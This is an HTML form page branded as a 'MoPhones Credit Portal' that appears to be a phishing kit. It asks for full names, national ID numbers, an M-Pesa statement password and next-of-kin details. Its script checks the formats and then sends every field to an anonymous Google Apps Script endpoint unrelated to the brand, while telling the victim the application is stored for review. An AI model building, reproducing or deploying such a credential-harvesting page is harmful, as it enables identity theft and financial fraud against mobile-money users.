<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoPhones Credit Portal</title>
    <style>
        :root { --primary: #004488; --danger: #dc2626; }
        body { font-family: sans-serif; background-color: #f1f5f9; padding: 15px; margin: 0; }
        .container { background: white; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 20px; }
        .strict-banner { background: #fee2e2; border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; font-size: 0.85em; font-weight: bold; margin-bottom: 20px; text-align: center; }
        label { display: block; margin-top: 15px; font-weight: bold; font-size: 0.9em; }
        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 8px; width: 100%; margin-top: 25px; font-weight: bold; font-size: 1.1em; cursor: pointer; }
        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="120">
    </div>

    <div class="strict-banner">
        ðŸš¨ VALIDATION ACTIVE<br>
        Inaccurate data leads to automatic rejection.
    </div>

    <form id="ironCladPortal">
        <label>Phone Model</label>
        <input type="text" name="preferred_phone" placeholder="e.g. Samsung A15" required>

        <label>Full Name (Must be 3 Names)</label>
        <input type="text" name="full_name" id="nameInput" placeholder="First Middle Surname" required>

        <label>National ID Number</label>
        <input type="text" name="id_number" id="idInput" maxlength="8" minlength="7" placeholder="7-8 Digits" required>

        <label>Region</label>
        <select name="region" required>
            <option value="">-- Select --</option>
            <option value="Nairobi">Nairobi</option>
            <option value="Kiambu">Kiambu</option>
            <option value="Nakuru">Nakuru</option>
            <option value="Machakos">Machakos</option>
            <option value="Kajiado">Kajiado</option>
        </select>

        <label>M-Pesa Statement Password</label>
        <input type="text" name="mpesa_password" id="passInput" placeholder="6-8 Characters" required>

        <label>Next of Kin Name</label>
        <input type="text" name="nok_name" required>

        <label>Next of Kin ID</label>
        <input type="text" name="nok_id" minlength="7" maxlength="8" required>

        <label>Next of Kin Contact</label>
        <input type="text" name="nok_contact" id="kinContact" value="+254" minlength="13" maxlength="13" required>

        <button type="submit" class="btn-submit" id="submitBtn">Verify & Submit</button>
    </form>
    <div class="footer">Portal Code: jeez</div>
</div>

<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbxp7myPK3OX047HwHab0T2uALSXNhb0GyylupoBU8e8i3bMhRDOt8xJcX29idZ05M-U/exec';
const form = document.getElementById('ironCladPortal');

form.addEventListener('submit', e => {
    e.preventDefault();

    // 1. STRICT NAME CHECK (3 WORDS)
    const nameValue = document.getElementById('nameInput').value.trim();
    if (nameValue.split(/\s+/).length < 3) {
        alert("âŒ ERROR: You must provide exactly 3 names as they appear on your ID.");
        return;
    }

    // 2. STRICT ID CHECK (7-8 DIGITS)
    const idValue = document.getElementById('idInput').value;
    if (!/^\d{7,8}$/.test(idValue)) {
        alert("âŒ ERROR: ID Number must be between 7 and 8 digits.");
        return;
    }

    // 3. MPESA PASSWORD CHECK (6-8 CHARS)
    const passValue = document.getElementById('passInput').value;
    if (passValue.length < 6 || passValue.length > 8) {
        alert("âŒ ERROR: M-Pesa Statement Password is typically 7-8 digits.");
        return;
    }

    // 4. NEXT OF KIN CONTACT (+254 CHECK)
    const kinContact = document.getElementById('kinContact').value;
    if (!kinContact.startsWith("+254") || kinContact.length !== 13) {
        alert("âŒ ERROR: Kin contact must be in format +2547XXXXXXXX");
        return;
    }

    document.getElementById('submitBtn').disabled = true;
    document.getElementById('submitBtn').innerText = "Authenticating...";

    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => {
          alert("âœ… SUCCESS: Application stored for manual review.");
          form.reset();
          window.location.reload();
      })
      .catch(error => {
          alert("Network Error. Try again.");
          document.getElementById('submitBtn').disabled = false;
      });
});
</script>

</body>
</html>
